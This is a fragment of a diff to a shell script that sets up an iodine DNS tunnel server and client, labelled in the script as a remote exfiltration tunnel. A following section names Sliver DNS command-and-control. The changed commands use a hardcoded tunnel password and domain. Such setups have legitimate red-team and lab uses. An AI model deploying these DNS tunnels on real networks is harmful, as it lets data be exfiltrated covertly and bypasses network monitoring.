@@ -3,11 +3,11 @@ set -e
 pass=$1 
 
 # ################# Iodine DNS Tunnel Remote Exfil tunnel ##########################
-# iodine c2c server 
-sudo iodined -f -P bleed 10.0.0.1 t.bleed.io 
+# iodine tunnel server 
+sudo iodined -f -c -P bleed 192.120.0.0 t.bleed.io 
 
-# iodine c2c client 
-sudo iodine -P bleed  -r 10.158.82.53 t.bleed.io 
+# iodine tunnel client 
+sudo iodine -P bleed  -f -r 10.158.82.53 t.bleed.io 
  
 
 # ################# Sliver DNS Remote C2 and Tunnel Remote Exfil tunnel ##########################
